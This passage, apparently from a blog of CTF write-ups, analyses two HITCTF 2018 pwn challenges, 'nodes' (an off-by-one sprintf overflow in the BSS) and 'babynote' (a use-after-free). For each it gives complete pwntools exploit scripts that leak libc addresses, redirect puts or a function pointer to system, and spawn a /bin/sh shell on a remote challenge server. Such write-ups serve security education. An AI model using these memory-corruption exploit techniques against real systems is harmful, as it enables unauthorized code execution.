<p><img src="/2018/02/07/HITCTF-PWN/nodes_1.png" alt="main"></p>
<p>set_size函数是对BSS段上的一个值进行初始化，设置为48，这个字段后续要作为read函数的第三个参数。</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_2.png" alt="set_size"></p>
<p>main函数中限定了节点数最多为149.</p>
<p>add_node函数，首先判断头节点是否存在，如果存在，就通过后向指针循环寻找下一节点，直到找到链表的尾部，添加新的节点；如果不存在，就构建头节点后再添加新的节点。 这里可以看见，read函数的第三个参数就是之前set_size函数里设置为48的那个字段unk_804a080。</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_3.png" alt="add_node"></p>
<p>通过add_node函数，可以了解到每一个节点的结构如下：</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_4.png" alt="nodes_structure"></p>
<p>edit_node函数通过value作为索引，找到对应节点，修改其data内容。</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_5.png" alt="edit_node"></p>
<p>print_node顺序打印链表中每个节点的value和data。</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_6.png" alt="print_node"></p>
<h3 id="2-漏洞-3"><a href="#2-漏洞-3" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><p>说实话，这题的漏洞对我隐藏的太深了，我大概看了三个小时才找到漏洞。</p>
<p>main函数中的case 1，会打印已有的节点数，其中这个byte_904a060是一个bss段上的字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(byte_804A060, <span class="string">"You have already insert %d nodes"</span>, nodes_num);</span><br></pre></td></tr></table></figure>
<p>在bss段找到它，发现它实际分配了32字节的空间。</p>
<p><img src="/2018/02/07/HITCTF-PWN/nodes_7.png" alt=""></p>
<p>数一下You have already insert XXX nodes字符串，如果nodes_num是3位数，那么字符串长度为33位，也就是说，当添加的节点数大于等于100时就会触发堆溢出漏洞。从上图能够看出，byte_904a060之后正好就是 unk_804a080,就是最开始设置为48的read参数，一旦堆溢出，byte_904a060的最后一个字符s就会覆盖 unk_804a080，即read可以读入的字符串长度变成0x73，覆盖next指针的值，再次调用print_node时就会泄露内存。</p>
<h3 id="3-漏洞利用-3"><a href="#3-漏洞利用-3" class="headerlink" title="3)漏洞利用"></a>3)漏洞利用</h3><p><strong>system函数地址的泄露</strong>：首先申请100个节点，这时会造成堆溢出漏洞。这样read的第三个参数变得很大，通过edit_node将第99个节点的next指针覆写为puts函数的got表地址。再调用print_node时，第100个节点的地址就会变为puts函数的got表地址puts@got，打印出来的value也就是当前puts函数的真实地址。再通过libc中puts与system的相对便宜进一步得到system函数地址。再通过edit_node操作第100个节点，修改puts@got中的内容为system函数地址。</p>
<p><strong>system函数调用</strong>： 当程序中调用puts时就相当于调用了system函数，可以事先在第一个节点的data中写入/bin/sh参数，当调用print_node时，触发puts(data)，即执行了system(‘/bin/sh’)</p>
<h3 id="4-exp-3"><a href="#4-exp-3" class="headerlink" title="4) exp"></a>4) exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0804A024</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./nodes'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40003</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 100</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">101</span>):</span><br><span class="line">	<span class="comment">#time.sleep(1)</span></span><br><span class="line">	p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">	p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit no.99</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Node's value:"</span>)</span><br><span class="line">p.sendline(<span class="string">'99'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'99'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">48</span> + p32(puts_got))</span><br><span class="line"></span><br><span class="line"><span class="comment">#list -&gt; leak puts_addr</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your nodes:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = int(p.recv(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr:0x%x"</span> %puts_addr</span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys_addr:0x%x"</span> %system_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit 100</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Node's value:"</span>)</span><br><span class="line">p.sendline(str(puts_addr))</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(str(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#list</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="5-babynote"><a href="#5-babynote" class="headerlink" title="5. babynote"></a>5. babynote</h2><h3 id="1-基本逻辑-4"><a href="#1-基本逻辑-4" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p>菜单类的题目，可以添加、编辑、删除和打印note。</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_1.png" alt="main"></p>
<p>add函数限定了note数量最多为3。通过add函数，能够看出程序管理每一块note的方法：有一个list数组用于存放每一个note的首地址，每一个note的大小是12字节，依次存放note中content的大小、content的地址和puts函数地址。</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_2.png" alt="add"></p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_3.png" alt=""></p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_4.png" alt=""></p>
<p>edit函数通过note的编号作为索引修改content的内容。</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_5.png" alt=""></p>
<p>prints函数调用每一个note中的第三个字段（正常来说是puts函数地址）来打印每一个note的内容。</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_6.png" alt=""></p>
<p>delete函数释放note的content地址空间和note地址空间，然而并没有将指针置0.</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_7.png" alt=""></p>
<h3 id="2-漏洞-4"><a href="#2-漏洞-4" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><p>在delete函数中，被释放的指针没有置空，导致UAF（use after free）漏洞，即可以对已释放的内继续进行操作。</p>
<h3 id="3-漏洞利用-4"><a href="#3-漏洞利用-4" class="headerlink" title="3) 漏洞利用"></a>3) 漏洞利用</h3><p>非常不巧，本题开了PIE保护，即程序的地址也不再是固定不变的了，漏洞的利用变得更加困难。</p>
<p><strong>system函数的地址泄露：</strong></p>
<p>涉及了一个新的知识点：main_arena。main_arena存在于libc的BSS段中，用于存放各种bin的头结点信息，如fastbin，smallbin和unsortedbin等。本题中，当最开始add了一个note，并设置content大小为一个大于64字节的数（例如100），再delete这个note时，这一块内存会首先放入unsortedbin当中，并将FD和BK设置为main_arena中unsortedbin的头结点地址。</p>
<p>可以通过调试查看，在100字节的content没有被释放时，main_arena的结构是这样的：</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_9.jpg" alt=""></p>
<p>释放这个note之后，main_arena如下：</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_8.jpg" alt=""></p>
<p>其中bins里存放的就是各类型的bin头结点的地址，发现0x5824b010就是unsortedbin头结点的地址，查看0x5824b010，就能看见刚刚释放的content 地址。</p>
<p><img src="/2018/02/07/HITCTF-PWN/babynote_10.png" alt=""></p>
<p>因此，system函数的地址泄露可以通过读取已释放的content的前四字节（FD指针）泄露libc的地址，进而泄露system的地址。</p>
<p><strong>system函数的覆写和调用：</strong></p>
<p>本题中note固定占用12字节，属于fastbin。当某一content正好也要申请12字节空间时，系统会先再fastbin上寻找是否有大小相同的chunk，如果有就会直接分配给content。如果这个chunk是之前释放的note，那么利用UAF漏洞，就可以修改内存。</p>
<p>先申请第一个note(note#0)，其content大小为100字节。再申请第二个note(note#1)，其content(content#1)大小为12字节。释放note #1和note #0。由于fastbin是LIFO的原则，此时fastbin上的chunk顺序为：note#0-&gt;note#1-&gt;content#1。此时再申请第三个note(note #2)，并要求content也为12，系统从fastbin中顺序摘下大小为12的chunk进行分配，那么note#2对应的就是note#0，content#2对应的就是note #1。</p>
<p>此时向content#2输入，就会覆写掉note#1原本的内容，将前两个字段写成/bin/sh，第三个字段写成system函数地址；然后再调用prints对note#1操作，就相当于直接调用了system函数。</p>
<p>PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。</p>
<h3 id="4-exp-4"><a href="#4-exp-4" class="headerlink" title="4) exp"></a>4) exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40004</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">offset = <span class="number">0x1b27b0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Content size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"New content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prints</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line">prints(<span class="number">0</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:0x%x"</span> %addr</span><br><span class="line">libc_base = addr - offset</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys:0x%x"</span>%sys_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'c'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\0'</span>+p32(sys_addr))</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
        </section>
    </div>
</div>






</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2018/06/27/青岛链弯杯-note/">青岛链弯杯--note</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2018/06/05/suctf2018-note/">suctf2018-note</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>